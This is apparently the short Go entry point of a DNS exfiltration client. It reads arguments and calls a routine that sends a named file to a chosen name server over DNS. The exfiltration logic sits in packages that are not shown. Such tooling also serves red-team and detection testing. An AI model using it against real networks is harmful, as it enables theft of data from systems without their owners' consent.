package main

import (
	"dns-exfiltration-client/exfiltrator"
	"dns-exfiltration-client/parser"
)

func main() {
	args := parser.ParseArgs()
	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(args.NameServer)
	dnsExfiltrator.ExfiltrateFile(args.Filename)
}
